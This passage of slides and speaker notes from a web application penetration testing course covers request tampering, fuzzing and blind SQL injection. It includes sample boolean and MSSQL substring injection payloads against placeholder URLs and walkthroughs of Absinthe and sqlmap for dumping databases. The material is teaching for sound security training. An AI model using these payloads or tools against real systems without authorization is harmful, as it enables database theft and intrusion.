	- TamperData for Firefox is a plug-in to intercept requests
	- TamperIE for Internet Explorer is the IE version of Tamper Data
	- Many others are available

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Manual discovery can be slow and tedious, but it is not difficult.  

There are quite a few tools available to assist in this process.  The first one is your favorite web browser. Firefox in particular has many plug-ins which can help such as TamperData and LiveHTTPHeaders.  You may also find Netcat to be an invaluable tool throughout most stages of hacking.

In many cases, attacks can be launched directly from the browser.

Plugins, such as "TamperData" for Firefox, provide handy capabilities, such as identifying and allowing the manipulation of hidden fields, cookies, and header information.  

A web-hacking proxy such as Paros or WebScarab will allow for the viewing, tracking, and modifying of data as it is transmitted over the network.  This removes much of the complexity of deciding what information should be included in an attack.

Sniffers, such as Wireshark, can assist with understanding what each request/response looks like on the network.  Sniffers and proxies can assist with targeted attacks using raw tools such as Netcat and OpenSSL. As we've mentioned, OpenSSL (s_client) allows us to hack directly over HTTPS or any SSL-wrapped connection. Netcat is a great tool for interacting with the web-server directly, giving complete control.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 95 -->
<!--[Rectangle 2]-->
TamperData

<!--[Rectangle 3]-->
- TamperData is a FireFox Extension
- This extension allows us to mangle each request
- Easier to set up than an interception proxy because it's within the browser

<!--[Picture 3]-->

<!--[TextBox 3]-->
Click here to modify the request

<!--[Left Arrow 4]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
TamperData is a Firefox extension that allows the user to edit the HTTP headers as they interact with the application.  It allows us to mangle each request to test for SQL injection (or XSS as we will see later.)

Here is the pop up that asks if the attacker would like to edit this transaction, submit it as is, or abort the request.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 96 -->
<!--[Rectangle 2]-->
Tampering with a Request

<!--[Picture 3]-->

<!--[Picture 4]-->

<!--[Picture 5]-->

<!--[Picture 6]-->

<!--[TextBox 3]-->
List of all the requests seen by TamperData

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Information about the selected Request

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Header Information

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Payload Information

<!--[Left Arrow 4]-->

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Various tasks TamperData can perform

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
SQL injection strings   
pre-loaded

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
If on the previous screen the attacker had chosen "Tamper", this screen appears. It breaks apart the various parts of the request into easy to understand pieces.  The attacker is able to edit which ever pieces they would like and select ok.  They are then prompted with the previous screen again, where they can select submit to send in their changes.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 97 -->
<!--[Rectangle 2]-->
Fuzzing

<!--[Rectangle 3]-->
- Automated tests are also useful
- Typically referred to as fuzzing
- Fuzzing applications will submit data through the various application inputs
- Some fuzzing is totally random, but the most effective uses known attack strings
- Many tools  are able to perform fuzzing:
	- Burp Suite's Intruder
	- w3af comes with fuzzers

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Fuzzing is a term referring to automated testing.  This testing is a brute force type of attack that will place input into specified parameters of an application and see what happens.  The tools used can be built to place random strings into these parameters or specific strings to test for things like SQL injection or XSS flaws.

Fuzzers are used to browse a web page, and modify or inject malicious data in any way possible automatically. This can include web form fields, cookies, URI elements, form submission types, etc.  Check the results for indicators of success, but be aware that these indicators are not always accurate and can lead to false-positives and occasionally false-negatives.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 98 -->
<!--[Title 1]-->
# Burp Intruder Fuzzing


<!--[Content Placeholder 3]-->
- Burp Intruder is the automated attack tool within the suite
- We send requests from the other tools to the intruder
- We can then choose which attacks we would like to run

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The Burp Intruder is the automated attack tool within the suite.  The Intruder is limited with in the free version of Burp, but still contains numerous attacks within it.  When we send requests to the intruder, it attempts to automatically determine which parameters should be targeted.  We are able to use the buttons on the right hand side of the screen to move this selection.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 99 -->
<!--[Rectangle 2]-->
After Fuzzing

<!--[Rectangle 3]-->
- When fuzzing is complete we look for interesting results
	- Database error messages or HTTP 500 status codes
- Record them for the next phase, Exploitation!
	- We need to record:
		- The request
		- The parameter that was fuzzed
		- The input that caused the error

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Fuzzing is not hacking, or at least not in totality.  Fuzzing is an approach to finding vulnerabilities in an automated fashion.  The results of fuzzing should be considered raw data for analysis.  Even the most mature automated tools return data which will need to be verified.

Record the data found, review it, and keep it in mind as we head towards exploitation.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 100 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
- *** SQL Injection Exercise***
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next exercise we will explore how to use the SQL inject me extension.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 101 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
- *** Blind SQL Injection***

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Blind SQL injection is usually the result of a misguided attempt to protect against SQL injection by hiding the error messages generated by the database.. In this next section we are going to explore how it works.  We will also look at some of the tools available to help us with the attack.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 102 -->
<!--[Rectangle 2]-->
Blind SQL Injection

<!--[Rectangle 3]-->
- SQL injection depends on the error messages being visible to the attacker
- If the application uses the input, but doesn't display errors, it is still vulnerable
- It will just take a little more time and effort to exploit it
- This is blind SQL injection
- The attacker uses "yes/no" questions to abuse the flaw
	- If the SQL statement executes correctly, the site works
	- If it doesn't, something is wrong with the SQL query
- Adjusting the query moves the attacker through the database

Note:
<!--[Text Box 3]-->

<!--[Text Box 4]-->

<!--[Text Box 6]-->
To avoid information leakage and other effects of SQL injection, many developers actively fix SQL injection flaws in their code, providing the best protection.  However, some developers provided us with an exciting challenge, and instead of fixing the bugs properly, they instead relied on blocking or sanitizing SQL error messages.  This led to what are now called "Blind SQL Injection" attacks.

Database Servers provide a very feature-rich SQL instruction-set.  Comparing results or subsections of results can be completed within the SQL interpreter on the server, prior to returning any results.  Loops, conditions, process control, and more can be accomplished before the web application receives the results.

Many database vendors have also "embraced and extended"(R) the language to include even more fun, if in a vendor-specific fashion.

<!--[Rectangle 7]-->

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 103 -->
<!--[Rectangle 2]-->
Discovering Blind SQL

<!--[Rectangle 3]-->
- Look for Boolean behaviours in the application
- They are found by looking for yes and no answers to the below examples
- An example would be a catalog page:
	- index.php?itemid=9
		- Returns data about a specific item #9
	- index.php?itemid='
		- Returns a no item found message
	- index.php?itemid=9' and 1=1; --
		- Returns data about item #9
	- index.php?itemid=9' and 1=0; --
		- Returns a no item found message

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
By repeatedly submitting a SQL query and some comparison text (and behavior based on the comparison), we create a YES/NO condition, indicating whether a specific portion of the results match what we handed in.  

For instance, if we send a query which returns a username "asmith," and we tell the database to compare the first byte against the letter "a" (being the first letter in the alphabet). and then pause a certain timeframe if they match. we can identify whether or not that first letter is  "a".  Since the first attempt matches, we move on.  Repeat the query and have the database compare the second character against "a", then "b", then "c", etc., until we determine the second letter is "s".  Et cetera...

This is a very iterative and noisy process, but it can be very powerful for an attacker.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 104 -->
<!--[Rectangle 2]-->
20 Questions

<!--[Rectangle 3]-->
- Now we play a game using the yes/no answers
- We ask questions of the DB
- Keep in mind the differences between RDBMS systems
- Here we are targeting a MSSQL database
- http://example.tgt/index.php?ID=1\   
<span style="text-decoration: underline;">and substring ((select top 1 name from sysobjects where \   
xtype='u'),1,1)>'m'</span>
- http://example.tgt/index.php?ID=1\   
and substring ((select top 1 name from sysobjects where \   
xtype='u'),1,1)<'s'

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
To map out the various fields in the database and retrieve data, we now will play 20 questions.  We ask yes/no questions to gather information.  This process can be quite lengthy.  

In the example above, we are using the substring function to return the first letter of the first item in the sysobjects table.  We will then use comparison operators to narrow down to the correct letter.  Then we will use the substring to start looking for the second letter.  Repeating this process, we can retrieve all of the data regarding the schema and the actual data in the database.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 105 -->
<!--[Rectangle 2]-->
Blind SQL Using Timing

<!--[Rectangle 3]-->
- Keep in mind that the boolean conditions may be how long the page takes to process
- Use functions to insert time into a query
	- Benchmark()
	- Waitfor()
- Using questions like, if the answer is true then use the waitfor() to delay the response

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Sometimes the Boolean condition we are looking for does not show as data on the page.  The two states are found through the delay in returning a page to the browser.  To enhance this timing, we can use the various delay functions within different database engines to increase the time for true conditions.

Benchmark is a MySQL function, while waitfor is from MS SQL.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 106 -->
<!--[Rectangle 2]-->
Tools

<!--[Rectangle 3]-->
- Fewer tools work with blind SQL injection
- Some examples would be
	- Absinthe
		- Also works for "normal" SQL injection
	- SQLMap
		- Sqlmap.sourceforge.net
		- Part of w3af

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Very few tools are available that reliably test blind SQL injection.  We are going to explore Absinthe and SQLMap which are two of the few tools available.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 107 -->
<!--[Rectangle 2]-->
Absinthe

<!--[Rectangle 3]-->
- Written by  Nummish and Xeron
- Available at:
	- https://github.com/HandsomeCam/Absinthe
- It is one of the first well-functioning tools to work against blind SQL injection
- It is a windows tool
- We mainly use it if our goal is to return large data sets

<!--[Picture 4]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Absinthe is a GUI-based tool that automates the process of downloading the schema and contents of a database which is vulnerable to Blind SQL Injection.  It is written in C# and will run on Windows or Linux using Mono. 
  
Absinthe will not detect vulnerable applications.  It requires the attacker to find the flaw and configure Absinthe to make use of it.  After that it will run and dump various things from the database, including all of the data.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 108 -->
<!--[Rectangle 2]-->
Absinthe in Use

<!--[Rectangle 3]-->
1. Select the database type
2. Enter the URL of the form action
3. Select the form method
4. Choose authentication (optional)
5. Enter the parameters
	- Select "Injectable Parameter" for the target parameter
6. Initialize the injection

<!--[Picture 4]-->

<!--[Oval 75]-->
**1**

<!--[Oval 75]-->
**2**

<!--[Oval 75]-->
**4**

<!--[Oval 75]-->
**3**

<!--[Oval 75]-->
**5**

<!--[Oval 75]-->
**6**

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Once we determine that there is a SQL injection vulnerability, we can use Absinthe to retrieve the database.  After starting it up, we need to configure Absinthe to use the application and set any authentication needed.  After that, the parameters used within the page need to be configured.  The parameter that is vulnerable is set as "injectable."  Initializing the injection lets Absinthe test the configuration.

The screenshot above shows the main panel or tab.  It is where you configure Absinthe to abuse the injection flaw that you have found.  As you can see, Absinthe has quite a few parameters including places for authentication and the connection method required.  At the bottom of the tab is where the attacker specifies the various parameters required by the web application being attacked and marks the one(s) that is vulnerable.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 109 -->
<!--[Rectangle 2]-->
Retrieving DB Schema   
and Data

<!--[Rectangle 3]-->
- Now the attacker can:
	- Retrieve the username
	- Retrieve the tables in the DB
	- Map the fields in the tables
	- Dump the entire dataset to XML files

<!--[Picture 4]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Using the next two tabs, the attacker is able to map out the entire database schema and the user name that the application uses to connect to the DB.  They are then able to select the fields they would like to export, and dump them to an XML file.

In the screenshot is the tab that enables us to map out the DB schema.  First you will retrieve the username used by the application to connect to the database.  This will potentially allow you to know the privileges available within the DB.  You can then retrieve the table names.  After that, you can select the table you are interested in and retrieve its field names.

Finally on the third tab, you configure which fields you are interested in and Absinthe will download them into an XML document.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 110 -->
<!--[Title 1]-->
# sqlmap


<!--[Content Placeholder 2]-->
- sqlmap is a Python application that performs SQL injection discovery and exploitation
	- http://sqlmap.sourceforge.net
	- It is also integrated into w3af
- Its main focus is providing a platform that simplifies SQL injection attacks
- It is one of the best free tools for this type of attack
	- This is due to the lower failure rate in successfully exploiting a flaw

<!--[Picture 5]-->

<!--[Left Arrow 4]-->

<!--[Left Arrow 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
SQLMap is a command line tool written in Python.  It is able to perform SQL injection attacks against applications, blind and normal.  SQLMap will run on any platform that Python supports.  It is available as a stand-alone tool, but has also been included in more recent versions of w3af.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 111 -->
<!--[Title 1]-->
# sqlmap Features


<!--[Content Placeholder 2]-->
- sqlmap has many powerful features
- It supports both types of SQL injection
	- Normal or "in-band" SQL injection
		- Called "in-band" because the results are typically visible in the HTML response from the application
	- Blind SQL injection, in which database error messages and output of queries are not shown in response messages
- Can also use Google searches to find SQL errors indexed and cached by Google
- Can import target URLs from Burp or WebScarab tools
- Provides a variety of useful, pre-built attacks
	- Read files from the server, encoding files for transfer
	- Provides an OS shell, giving access to the database server

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
SQLMap has a number of interesting features.  It performs two different types of SQL injection, in-band and blind.  

In-band injection is used when the record set is written to the page.  This allows for the return of the entire record set at once.  Blind injection sees the enumeration techniques based on different results with good queries and bad queries.

SQLMap will also perform injection against targets found via Google.  This is not typically useful during a pen-test because of the potential for attacking out of scope targets.

SQLMap will also read arbitrary files from the target database server and interact with the OS shell.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 112 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
And now we will wrap it up for the day.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 113 -->
<!--[Rectangle 2]-->
Summary

<!--[Rectangle 3]-->
- Covered the first part of discovery
- Started "malicious" traffic
- We will explore further vulnerability discovery

- Thank you!

Note:
<!--[Text Box 3]-->
Now, you've finished PEWAPT101.3: Server-side Discovery. You've examined web sites and found vulnerabilities. You've actually sent malicious traffic up to the application and seen the results. 

Get a good night's sleep!


<!--[Rectangle 4]-->

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

